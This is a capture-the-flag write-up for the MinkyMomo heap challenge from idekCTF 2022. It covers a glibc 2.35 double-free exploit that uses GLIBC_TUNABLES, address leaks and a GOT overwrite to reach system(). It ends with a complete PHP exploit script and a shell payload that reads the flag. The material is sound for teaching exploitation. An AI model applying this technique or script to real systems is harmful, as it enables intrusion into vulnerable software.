# MinkyMomo - idekCTF 2022 (pwn, 1 solved, 500p)

## Introduction
MinkyMomo is a pwn task.

An archive containing a binary a libc and its corresponding loader (`ld.so`) is
provided.

The libc provided is `Ubuntu GLIBC 2.35-0ubuntu3.1`.

An other archive containing a Dockerfile and a configuration for nsjail was made
available later during the competition.

## Reverse engineering
The binary prints a menu with 5 options:

1. create an episode
2. remove an episode
3. display an episode
4. resurrect series
5. end series

The choice of the user is read with `gets` and converted to an integer with
`atoi`.

The first 3 options are typical heap challenge features. Notes can be at most 71
(`0x47`) bytes. Only 10 notes can be created.

"End series" makes a call to `exit`.

"Resurrect series" is quite unusual: it re-executes the binary.

```c
execv("./minkymomo", NULL);
```

## Vulnerabilities
The first obvious vulnerability is that the binary reads user input with `gets`.
Exploitation is not so obvious since the function that calls `gets` never
returns.

The second vulnerability is that, once an episode has been allocated, it is
never removed from the global list. It is possible to display an unallocated
episode, and it is possible to free twice the same episode.

## Exploitation
### Leak heap address
It is possible to leak an address of the heap by allocating and deallocating two
notes.

The value of the first two chunks are `NULL ^ (addr1 >> 12)`, and
`addr1 ^ (addr2 >> 12)`.

Therefore, `leak1 ^ leak2 == addr1` in most cases.

### Re-exec
Exploitation of the allocator with the current primitive is not possible with
the current glibc version. It would require at least 7 of the 10 allocations
just to fill the cache list.

Fortunately, there is a way to configure the properties of the glibc allocator,
including the number of tcache per list.

```
% ./ld-2.35.so --list-tunables | grep malloc
glibc.malloc.trim_threshold: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.perturb: 0 (min: 0, max: 255)
glibc.malloc.hugetlb: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.mxfast: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.top_pad: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.mmap_max: 0 (min: 0, max: 2147483647)
glibc.malloc.tcache_unsorted_limit: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.arena_max: 0x0 (min: 0x1, max: 0xffffffffffffffff)
glibc.malloc.mmap_threshold: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.tcache_count: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.arena_test: 0x0 (min: 0x1, max: 0xffffffffffffffff)
glibc.malloc.tcache_max: 0x0 (min: 0x0, max: 0xffffffffffffffff)
glibc.malloc.check: 0 (min: 0, max: 3)
```

Changing these parameters require running a program with a special environment
variable, `GLIBC_TUNABLES`.

This can be done here by smashing the stack with `gets` until the `envp` array,
and calling `execv` to reload the program with the same environment array
(which now contains a modified value).

By leveraging the previous vulnerability, it is possible to start the binary
with a different tunables configuration.

### Heap and libc leaks
Assuming a tcache count of 2, an address of the heap can be leaked just like
explained in the first subsection of this chapter.

Assuming no fastbins, an address of the libc can be leaked by freeing a smallbin
and looking at its `fd` pointer (the first qword) which points to `main_arena`.

An ideal configuration of the tunables for this challenge is:
- `glibc.malloc.tcache_count=2`
- `glibc.malloc.mxfast=1`

### Code execution
Since glibc 2.35, `__free_hook` and friends are not used anymore. The usual
workaround is to change `strlen@got.plt` located within the libc. The libc needs
this symbol to resolve `strlen` to the most optimized implementation depending
on the CPU's capabilities. (Can `strlen` be implemented with AVX512
instructions?)

The idea is to leverage the double free to have a chunk located both in the
unsorted bin and the tcache list.

This can be done with the following list of actions:
1. allocate 3 chunks of size `S`
2. free all 3 chunks
3. allocate a 4th chunk of size `S`
4. free the last chunk a second time

By doing this, the last freed chunk will be both in the tcache list and in the
unsorted bin.

Chunks in the unsorted bin get coalesced. This property can be abused to
overwrite the metadata of the tcache list.

First, allocate 4 chunks labelled 1 through 4, then free the chunks 4 and 3 to
fill the tcache list.

```
tcache = NULL <-- 4 <-- 3
```

Then, free the chunk 2 so that it gets in the unsorted list. Allocate a 5th
chunk of size `S`. This chunk will be popped from the tcache list. Free chunk 2
to have it both in tcache list and unsorted bin.

```
tcache = NULL <-- 4 <-- 2
```

Delete the chunk 1. The tcache list is full, it will go in the unsorted bin.
Since it is next to a freed chunk (the chunk 2), both will be merged, which
results in the following memory layout:

```
0x0000000000000000 0x0000000000000081
0x000067bd51c19ce0 0x000067bd51c19ce0 [1] [unsorted]
0x3131313131313131 0x3131313131313131
0x3131313131313131 0x3131313131313131

0x0031313131313131 0x0000000000000041
0x000067bd51c19ce0 0x000067bd51c19ce0 [2]
0x3232323232323232 0x3232323232323232
0x3232323232323232 0x3232323232323232

0x0000000000000080 0x0000000000000040
```

Then allocate a 6th chunk of size `S - 0x10` to align the unsorted chunk *right*
before chunk 2 (which is still the head of tcache list)

```
0x0000000000000000 0x0000000000000031
0x3636363636363636 0x3636363636363636 [1] [6]
0x3636363636363636 0x3636363636363636

0x0036363636363636 0x0000000000000051
0x000067bd51c19ce0 0x000067bd51c19ce0 [unsorted]
0x000007dfa39c335d 0x347675821c19a36d [2]
0x3232323232323232 0x3232323232323232
0x3232323232323232 0x3232323232323232

0x0000000000000050 0x0000000000000040
```

Allocate a 7th chunk of any size but `S` to overwrite the metadata of the tcache
list. Make it point to the vicinity of `strlen@got.plt`

```
0x0000000000000000 0x0000000000000031
0x3636363636363636 0x3636363636363636 [1] [6]
0x3636363636363636 0x3636363636363636

0x0036363636363636 0x0000000000000031
0x0000000000000000 0x0000000000000041 [7]
0x000067bd2c3c769d 0x347675821c19a300 [2]

0x3232323232323232 0x0000000000000021
0x000067bd51c19ce0 0x000067bd51c19ce0 [unsorted]

0x0000000000000020 0x0000000000000040
```

Allocate two chunks of size `S` (8th and 9th). The 9th will be located at the
location chosen earlier.

By replacing the pointer with `system`, it is possible to get code execution by
displaying the content of an episode.

**Flag**: `idek{n0w_us3_y0ur_m1nky_st1ck_t0_tr4nslate_ep1sodes_13-46_f0r_me}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
const LOCAL = false;
const HOST  = "minkymomo.chal.idek.team";
const PORT  = 1337;

const OFF_ENVP = 0x148;

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}

function menu($fp)
{
	expectLine($fp, "Your options are:");
	expectLine($fp, "1) create episode");
	expectLine($fp, "2) remove episode");
	expectLine($fp, "3) display episode");
	expectLine($fp, "4) resurrect series");
	expectLine($fp, "5) end series");
	expectLine($fp, "");
	expectLine($fp, "What would you like to do?");
}

function add($fp, int $idx, string $data, int $size = null)
{
	if(null === $size)
		$size = strlen($data);

	menu($fp);
	fwrite($fp, "1\n");
	expectLine($fp, "");

	expectLine($fp, "You get to create a episode of minky momo.");
	expectLine($fp, "");

	expectLine($fp, "Which index would you like to store the episode at?");
	fwrite($fp, "$idx\n");
	expectLine($fp, "");

	expectLine($fp, "What size would you like your episode to be?");
	fwrite($fp, "$size\n");
	expectLine($fp, "");

	expectLine($fp, "What you want the episode to be about?");
	fwrite($fp, "$data\n");

	expectLine($fp, "");
	expectLine($fp, "Episode created.");
	expectLine($fp, "");
}

function del($fp, int $idx)
{
	menu($fp);
	fwrite($fp, "2\n");
	expectLine($fp, "");

	expectLine($fp, "You get to delete an episode.");
	expectLine($fp, "");

	expectLine($fp, "Which index would you like to delete an episode from?");
	fwrite($fp, "$idx\n");
	expectLine($fp, "");

	expectLine($fp, "Episode removed.");
	expectLine($fp, "");
}

function show($fp, int $idx) : string
{
	menu($fp);
	fwrite($fp, "3\n");
	expectLine($fp, "");

	expectLine($fp, "You get to display an episode.");
	expectLine($fp, "");

	expectLine($fp, "Which index would you like to display an episode from?");
	fwrite($fp, "$idx\n");
	expectLine($fp, "");

	expect($fp, "Episode plot: ");
	$line = line($fp);

	expectLine($fp, "");
	expectLine($fp, "Episode displayed.");
	expectLine($fp, "");

	return $line;
}

function restart($fp, string $payload)
{
	if(4 !== (int)$payload)
		throw new Exception("Wrong payload");

	menu($fp);
	fwrite($fp, "$payload\n");
	expectLine($fp, "");

	expect($fp, "Using your minky stick, you ressurrected as the parent's");
	expectLine($fp, " real child now!.");
	expectLine($fp, "");
}

printf("[*] Opening connection\n");
$time = microtime(true);

$fp = fsockopen(HOST, PORT);

if(!LOCAL)
	expectLine($fp, "== proof-of-work: disabled ==");

expectLine($fp, "Welcome to Minky Momo Episode Creator.");
expectLine($fp, "");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$tunables = [
	"glibc.malloc.tcache_count=2", // at least 2 to make a list
	"glibc.malloc.mxfast=1", // we want no fastbins
];
$env = "GLIBC_TUNABLES=" . implode(":", $tunables);
//$env = "LD_DEBUG=help";

// Leak
add($fp, 0, $env);
add($fp, 1, $env);

del($fp, 1);
del($fp, 0);

$addr = [show($fp, 0), show($fp, 1)];
$addr = array_map(fn(string $s) => str_pad($s, 8, "\x00"), $addr);
$addr = array_map(fn(string $s) => unpack("P", $s)[1], $addr);

$xor = $addr[0] ^ $addr[1];
printf("%X = %X ^ %X\n", $xor, $addr[0], $addr[1]);

add($fp, 2, $env);
add($fp, 3, $env);

$payload  = str_pad("4", OFF_ENVP, "\x00");
$payload .= pack("P*", $xor);
//$payload .= substr(pack("P", $xor), 0, 7); // remote crashes, why?
restart($fp, $payload);

////////////////////////////////////////////////////////////////////////////////
//printf("Stopped at %d\n", __LINE__); fgets(STDIN);

expectLine($fp, "Welcome to Minky Momo Episode Creator.");
expectLine($fp, "");

const SIZE = 0x40 - 8 - 1;

add($fp, 0, "clear; id; ls -la; cat *flag*; echo; sleep infinity");

add($fp, 1, str_repeat("1", SIZE));
add($fp, 2, str_repeat("2", SIZE));
add($fp, 3, str_repeat("3", SIZE));
add($fp, 4, str_repeat("4", SIZE));

// leak heap
del($fp, 4);
del($fp, 3);

$addr = [show($fp, 3), show($fp, 4)];
$addr = array_map(fn(string $s) => str_pad($s, 8, "\x00"), $addr);
$addr = array_map(fn(string $s) => unpack("P", $s)[1], $addr);
$heap = $addr[0] ^ $addr[1];

// leak libc
del($fp, 2);

$leak = show($fp, 2);
$leak = str_pad($leak, 8, "\x00");
$addr = unpack("P", $leak)[1];
$libc = $addr - 0x219ce0;

printf("[+] heap: %X\n", $heap);
printf("[+] libc: %X\n", $libc);
printf("\n");

assert(0 === ($libc & 0xFFF));
assert(0 === ($libc >> 48));


$strlen_got = $libc + 0x219090 - 0x10;

$wmemcmp    = $libc + 0x000c5ac0;
// ?
$strncpy    = $libc + 0x000a8950;
$system     = $libc + 0x50d60;

// tcache   = NULL <-- 4 <-- 3
// unsorted = [2]

del($fp, 1);

// tcache   = NULL <-- 4 <-- 3
// unsorted = [1] (2 gets merged with 1 !!!)

/*
0x0000000000000000 0x0000000000000081
0x000067bd51c19ce0 0x000067bd51c19ce0 [1] [unsorted]
0x3131313131313131 0x3131313131313131
0x3131313131313131 0x3131313131313131

0x0031313131313131 0x0000000000000041
0x000067bd51c19ce0 0x000067bd51c19ce0 [2]
0x3232323232323232 0x3232323232323232
0x3232323232323232 0x3232323232323232

0x0000000000000080 0x0000000000000040
*/


// pop one from tcache, dup bin in sbin and tcache
add($fp, 5, str_repeat("5", SIZE));
del($fp, 2); // middle of chunk

// tcache   = NULL <-- 3 <-- 2
// unsorted = [1]

// Cut a slice of the unsorted pie
add($fp, 6, str_repeat("6", SIZE - 0x10));

/*
0x0000000000000000 0x0000000000000031
0x3636363636363636 0x3636363636363636 [1] [6]
0x3636363636363636 0x3636363636363636

0x0036363636363636 0x0000000000000051
0x000067bd51c19ce0 0x000067bd51c19ce0 [unsorted]
0x000007dfa39c335d 0x347675821c19a36d [2]
0x3232323232323232 0x3232323232323232
0x3232323232323232 0x3232323232323232

0x0000000000000050 0x0000000000000040
*/

// overwrite header of 2
$payload = pack("P*", 0, (SIZE + 8 + 1) | 1, $strlen_got ^ ($heap >> 12));
add($fp, 7, $payload);

/*
0x0000000000000000 0x0000000000000031
0x3636363636363636 0x3636363636363636 [1] [6]
0x3636363636363636 0x3636363636363636

0x0036363636363636 0x0000000000000031
0x0000000000000000 0x0000000000000041 [7]
0x000067bd2c3c769d 0x347675821c19a300 [2]

0x3232323232323232 0x0000000000000021
0x000067bd51c19ce0 0x000067bd51c19ce0 [unsorted]

0x0000000000000020 0x0000000000000040
*/

// tcache = ??? <-- GOT <-- 2

// Pop tcache
add($fp, 8, str_repeat("8", SIZE));

// We expect shit to hit the fan
try {
	// smash the got
	$payload = substr(pack("P*",
		$wmemcmp, 0xdeadbeef,
		$strncpy, $system,
	), 0, -1);

	add($fp, 9, $payload, SIZE);
} catch(Exception $e) {
	// We can't rely on our functions anymore
	// Display episode 0
	fwrite($fp, "3\n");
	fwrite($fp, "0\n");
}

while($buffer = fread($fp, 4096))
	echo $buffer;
```
